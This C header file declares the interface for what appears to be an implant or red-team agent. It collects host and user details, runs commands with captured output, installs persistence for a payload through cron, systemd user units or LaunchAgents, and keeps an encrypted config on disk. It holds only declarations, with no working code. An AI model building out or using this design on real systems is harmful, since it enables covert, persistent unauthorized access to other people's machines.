#ifndef AGENT_H
#define AGENT_H

#include <stdint.h>
#include <stddef.h>

#define AGENT_OK           0
#define AGENT_ERR         (-1)
#define AGENT_ERR_FORMAT  (-2)
#define AGENT_ERR_TIMEOUT (-3)

/* collect: hostname/os/user/pid/ip */
typedef struct {
    char hostname[256];
    char os_name[64];
    char username[64];
    int pid;
    char ip_addr[64];
} agent_info_t;

int agent_collect(agent_info_t *info);

/* exec: fork+exec, capture stdout/stderr with timeout */
int agent_exec(const char *cmd, char *stdout_buf, size_t stdout_len,
               char *stderr_buf, size_t stderr_len, int timeout_sec);

/* persist: crontab / systemd user unit / LaunchAgents */
int agent_persist(const char *payload_path, int dry_run);
int agent_persist_cron(const char *payload_path, int dry_run);
int agent_persist_systemd(const char *payload_path, int dry_run);

/* config: JSON + encrypted on disk */
int agent_config_save(const char *path, const uint8_t *key, const char *json);
int agent_config_load(const char *path, const uint8_t *key, char *json_out, size_t json_len);

const char *agent_strerror(int err);

#endif
